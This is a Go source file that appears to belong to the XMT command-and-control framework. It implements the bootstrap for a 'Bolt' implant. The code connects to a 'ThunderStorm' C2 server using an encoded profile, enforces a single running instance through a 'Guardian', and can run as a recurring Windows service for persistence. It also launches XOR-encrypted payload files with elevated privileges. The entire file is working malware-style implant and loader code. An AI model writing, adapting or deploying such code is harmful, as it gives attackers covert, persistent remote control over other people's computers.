package bolt

import (
	"context"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device/devtools"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

// LaunchService will start the supplied function as a Windows service instead of directly launching it.
// It will be run once on startup and after every 'd' timeframe.
func LaunchService(d time.Duration, f func()) {
	if d < 0 {
		return
	}
	(&devtools.Service{Start: f, Exec: f, Interval: d}).Run()
}

// Boot will bootstrap and start a Bolt.
// The initial boolean will determine if this will respect the Global bolt
// Guardian (if guard is not Empty). If true, this bolt will exit if another Guardian is currently running.
// The two strings 'server' and 'guard' control the connection to ThunderStorm. If 'guard' is empty, this
// Bolt will ignore and will not attempt to configure a Guardian. The byte array provided is the C2 profile specified
// and will determine how the Bolt connects to ThunderStorm.
//
// This function does NOT return any values and WILL BLOCK while running. If 'server' or the config byte array
// are empty, this function fails and returns instantly.
func Boot(x bool, server, guard string, c []byte) {
	BootEx(x, guard, server, c, nil, nil)
}

// Launch will start the process of locating and triggering a Guardian.
// If a Guardian is not detected, this function will attempt to start a Bolt instance from the provided
// binary file DB list supplied.
func Launch(guardian string, files []string, key []byte) {
	LaunchEx(guardian, files, key, nil, nil)
}

// BootEx will bootstrap and start a Bolt.
// The initial boolean will determine if this will respect the Global bolt
// Guardian (if guard is not Empty). If true, this bolt will exit if another Guardian is currently running.
// The two strings 'server' and 'guard' control the connection to ThunderStorm. If 'guard' is empty, this
// Bolt will ignore and will not attempt to configure a Guardian. The byte array provided is the C2 profile specified
// and will determine how the Bolt connects to ThunderStorm.
//
// This extended function call allows for specification of functions to be called before start-up and on completion
// (if not nil).
//
// This function does NOT return any values and WILL BLOCK while running. If 'server' or the config byte array
// are empty, this function fails and returns instantly.
func BootEx(x bool, guard, server string, c []byte, start, end func()) {
	var cfg c2.Config
	if err := cfg.ReadBytes(c); err != nil {
		return
	}
	p, err := cfg.Profile()
	if err != nil {
		return
	}
	g, err := man.Guard(guard)
	if err != nil {
		if x {
			return
		}
	}
	if g != nil {
		defer g.Close()
	}
	s, err := c2.Default.Connect(server, nil, p)
	if err != nil {
		return
	}
	if start != nil {
		start()
	}
	w := make(chan os.Signal, 1)
	signal.Notify(w, syscall.SIGINT, syscall.SIGQUIT)
	go func() {
		<-w
		s.Close()
	}()
	s.Shutdown = func(_ *c2.Session) {
		g.Close()
		s.Close()
	}
	s.Wait()
	if close(w); end != nil {
		end()
	}
}

// LaunchEx will start the process of locating and triggering a Guardian.
// If a Guardian is not detected, this function will attempt to start a Bolt instance from the provided
// binary file DB list supplied.
//
// This extended function call allows for specification of functions to be called before start-up and on completion
// (if not nil).
func LaunchEx(guardian string, files []string, key []byte, start, end func()) {
	if len(files) == 0 {
		return
	}
	if man.Check(guardian) {
		return
	}
	if start != nil {
		start()
	}
	var x crypto.XOR
	if len(key) > 0 {
		x = crypto.XOR(key)
	}
	for i, f := 0, cmd.F().SetFallback(true).SetElevated(true).SetSession(false); i < 5; i++ {
		if _, err := man.WakeFileContext(context.Background(), guardian, files[util.FastRandN(len(files))], x, f); err == nil {
			break
		}
	}
	if end != nil {
		end()
	}
}
